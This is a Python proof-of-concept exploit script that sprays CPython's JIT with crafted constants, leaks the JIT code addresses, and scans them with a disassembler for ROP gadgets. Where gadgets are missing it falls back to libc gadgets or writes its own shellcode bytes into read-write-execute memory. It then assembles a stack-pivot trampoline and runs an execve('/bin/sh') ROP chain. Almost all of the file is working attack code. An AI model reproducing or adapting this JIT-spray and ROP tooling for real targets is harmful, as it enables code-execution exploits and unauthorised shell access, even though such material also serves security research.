#!/usr/bin/env python3
import ctypes
import mmap
import struct
import json
from multiprocessing import Pool, Manager
from capstone import *
import jitexecleak
from libc_gadget_finder import get_runtime_gadget_addresses

PAGE_SIZE = 0x1000

# MAGIC_VALUES updated to emphasize short, high-frequency instruction bytes observed
# in CPython JIT stencils rather than shellcode-derived 4-byte chunks.
MAGIC_VALUES = [
    0x000000C3,  # ret
    0x00005FC3,  # pop rdi; ret
    0x00005EC3,  # pop rsi; ret
    0x00005AC3,  # pop rdx; ret
    0x00005BC3,  # pop rbx; ret (temporary storage helper)
    0x000031D2,  # xor edx, edx
    0x004831C0,  # xor rax, rax
]

def allocate_rwx(size=PAGE_SIZE):
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    addr = libc.mmap(None, size, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                     mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, -1, 0)
    if addr == -1:
        raise RuntimeError("mmap failed")
    return addr

def generate_jit_func_named(seed, magic_value):
    code = f"""
def f(x):
    # Nested helper to trigger CALL-related stencils
    def h(a, b):
        return (a ^ b) & 0xFFFFFFFF

    # Dictionary and object operations to trigger STORE_SUBSCR_DICT, LOAD_ATTR, COMPARE_OP stencils
    d = {{}}
    class Obj:
        val = 0

    obj = Obj()
    acc = x
    for i in range({3000 + seed * 500}):
        acc ^= ({magic_value} + (i << (i % 8)))
        acc = ((acc << (i % 5)) | (acc >> (32 - (i % 5)))) & 0xFFFFFFFF
        acc += ({magic_value} >> (i % 16))
        acc *= 3 + (i % 4)
        acc ^= (acc >> ((i+3) % 8))
        acc ^= ({magic_value} + i) * ((acc >> 3) & 0xff)
        acc += (i ^ {magic_value})
        
        # Trigger various stencils
        acc = h(acc, i & 0xff)
        
        if i % 100 == 0:
            d[i] = acc & 0xff
            acc ^= d.get(i, 0)
        
        if i % 200 == 0:
            obj.val = acc & 0xffff
            acc += obj.val
        
        if acc > {magic_value}:
            acc -= 1
        elif acc < (i & 0xff):
            acc += 1
    
    return acc
"""
    scope = {}
    exec(code, scope)
    return scope['f']

def find_gadgets(jit_addr, blob, gadgets_needed):
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    found = {}
    for i in range(len(blob) - 10):
        insns = list(md.disasm(blob[i:i+10], jit_addr + i))
        if len(insns) >= 2:
            for mnemonic, operand in gadgets_needed:
                key = f"{mnemonic} {operand}".strip()
                if key in found:
                    continue
                
                # Standard pop/syscall gadgets followed by ret
                if (insns[0].mnemonic == mnemonic and operand in insns[0].op_str and
                    insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
                
                # Special handling for xor edx, edx; ret
                elif (mnemonic == "xor" and operand == "edx, edx" and
                      insns[0].mnemonic == "xor" and "edx" in insns[0].op_str and
                      insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
                
                # pop rbx; ret
                elif (mnemonic == "pop" and operand == "rbx" and
                      insns[0].mnemonic == "pop" and "rbx" in insns[0].op_str and
                      insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
    
    return found

def provide_gadget_shellcode(mnemonic, operand=""):
    shellcodes = {
        "pop rax": b"\x58\xc3",
        "pop rdi": b"\x5f\xc3",
        "pop rsi": b"\x5e\xc3",
        "pop rdx": b"\x5a\xc3",
        "syscall": b"\x0f\x05",    # No ret needed - execve replaces process!
    }
    key = f"{mnemonic} {operand}".strip()
    addr = allocate_rwx()
    ctypes.memmove(addr, shellcodes[key], len(shellcodes[key]))
    return addr

def allocate_binsh():
    binsh_str = b"/bin/sh\x00"
    addr = allocate_rwx()
    ctypes.memmove(addr, binsh_str, len(binsh_str))
    return addr

def worker_task(args):
    """Worker function for parallel JIT generation and gadget scanning"""
    seed, magic_value, gadgets_needed = args
    
    print(f"[Worker {seed}] Generating JIT function with magic 0x{magic_value:08X}...")
    jit_func = generate_jit_func_named(seed, magic_value)
    
    # Warm up
    for i in range(5000):
        jit_func(i)
    
    try:
        jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
        print(f"[Worker {seed}] JIT @ {hex(jit_addr)}, size: {size}")
    except RuntimeError as e:
        print(f"[Worker {seed}] JIT compilation failed: {e}")
        return {}
    
    blob = (ctypes.c_ubyte * size).from_address(jit_addr)
    found_gadgets = find_gadgets(jit_addr, bytes(blob), gadgets_needed)
    
    for key, addr in found_gadgets.items():
        print(f"[Worker {seed}] Found gadget: {key} @ {hex(addr)}")
    
    return found_gadgets

def execute_rop_chain(gadgets):
    binsh_addr = allocate_binsh()
    stub = allocate_rwx()
    stack = allocate_rwx(0x1000)

    chain = [
        gadgets["pop rax"], 59,
        gadgets["pop rdi"], binsh_addr,
        gadgets["pop rsi"], 0,
        gadgets["pop rdx"], 0,
        gadgets["syscall"]
    ]

    print("\n=== [ ROP Stack Layout ] ===")
    for i, val in enumerate(chain):
        ctypes.c_uint64.from_address(stack + i * 8).value = val
        print(f"[Stack +{i*8:#04x}] = {hex(val)}")

    first_gadget_addr = chain[0]
    stack_after_first_gadget = stack + 8

    trampoline = b"\x48\xbc" + struct.pack("<Q", stack_after_first_gadget)
    trampoline += b"\x48\xb8" + struct.pack("<Q", first_gadget_addr)
    trampoline += b"\xff\xe0"
    ctypes.memmove(stub, trampoline, len(trampoline))

    print("\n=== [ Trampoline Info ] ===")
    print(f"[Trampoline Address]      = {hex(stub)}")
    print(f"[Trampoline Bytes]        = {trampoline.hex()}")
    print(f"[Stack Base Address]      = {hex(stack)}")
    print(f"[RSP after 1st gadget]    = {hex(stack_after_first_gadget)}")

    input("\nPress Enter to execute ROP chain...\n")
    fn = ctypes.CFUNCTYPE(None)(stub)
    fn()

def main():
    import os
    
    # Load stencil stats if available
    try:
        with open("stencil_gadgets.json", 'r') as f:
            data = json.load(f)
        print("[stencil-json] summary ret count=", data['summary'].get('ret'))
        print("[stencil-json] pop_rdi_ret present?", 
              any('pop_rdi_ret' in v for v in data.get('per_func', {}).values()))
    except:
        print("[stencil-json] not found or unreadable")

    gadgets_needed = [
        ("pop", "rax"),
        ("pop", "rdi"),
        ("pop", "rsi"),
        ("pop", "rdx"),
        ("syscall", ""),
        ("xor", "edx, edx"),
    ]

    # ===== STEP 1: Search in JIT code first =====
    print("\n[*] Searching for gadgets in JIT code...")
    
    # Prepare parallel tasks
    num_workers = min(len(MAGIC_VALUES), os.cpu_count() or 4)
    tasks = [(seed, MAGIC_VALUES[seed % len(MAGIC_VALUES)], gadgets_needed) 
             for seed in range(num_workers)]
    
    print(f"[*] Starting {num_workers} parallel workers...")
    
    # Run workers in parallel
    found_gadgets_global = {}
    with Pool(processes=num_workers) as pool:
        results = pool.map(worker_task, tasks)
    
    # Merge JIT results
    for result in results:
        for key, addr in result.items():
            if key not in found_gadgets_global:
                found_gadgets_global[key] = addr
                print(f"[+] JIT: {key} @ {hex(addr)}")
    
    # ===== STEP 2: Check what's missing and search in libc =====
    missing_gadgets = []
    for mnemonic, operand in gadgets_needed:
        key = f"{mnemonic} {operand}".strip()
        if key.lower() != "xor edx, edx" and key not in found_gadgets_global:
            missing_gadgets.append(key)
    
    if missing_gadgets:
        print(f"\n[!] Missing gadgets from JIT: {missing_gadgets}")
        print("[*] Searching in libc as fallback...")
        
        try:
            libc_gadgets, libc_base = get_runtime_gadget_addresses()
            print(f"[+] Found {len(libc_gadgets)} gadgets in libc (base: {hex(libc_base)})")
            
            # Map libc gadgets to our naming convention (only for missing ones)
            libc_mapping = {
                'pop rax': 'pop_rax_ret',
                'pop rdi': 'pop_rdi_ret',
                'pop rsi': 'pop_rsi_ret',
                'pop rdx': 'pop_rdx_ret',
                'syscall': ['syscall', 'syscall_ret'],  # Prefer bare syscall (execve doesn't return!)
            }
            
            for key in missing_gadgets:
                libc_key = libc_mapping.get(key)
                
                # Handle syscall special case (try multiple keys)
                if isinstance(libc_key, list):
                    for lk in libc_key:
                        if lk in libc_gadgets:
                            found_gadgets_global[key] = libc_gadgets[lk]
                            print(f"[+] libc: {key} @ {hex(libc_gadgets[lk])} [{lk}]")
                            break
                elif libc_key and libc_key in libc_gadgets:
                    found_gadgets_global[key] = libc_gadgets[libc_key]
                    print(f"[+] libc: {key} @ {hex(libc_gadgets[libc_key])}")
                    
        except Exception as e:
            print(f"[!] libc gadget discovery failed: {e}")
    else:
        print("\n[+] All gadgets found in JIT! No need for libc search.")
    
    # Fill gaps with shellcode
    remaining_gadgets = set(f"{m} {o}".strip() for m, o in gadgets_needed)
    for key in remaining_gadgets:
        if key.strip().lower() == "xor edx, edx":
            continue
        if key not in found_gadgets_global:
            mnemonic, operand = key.split() if ' ' in key else (key, "")
            print(f"[!] Gadget {key} not found, providing shellcode.")
            found_gadgets_global[key] = provide_gadget_shellcode(mnemonic, operand)

    print("\n=== [ All Found Gadgets ] ===")
    for key, addr in found_gadgets_global.items():
        print(f"[+] {key:<12} => {hex(addr)}")

    # Execute
    dry_run = False
    if dry_run:
        print("\n[DRY-RUN] Skipping ROP chain execution.")
    else:
        execute_rop_chain(found_gadgets_global)

if __name__ == "__main__":
    main()
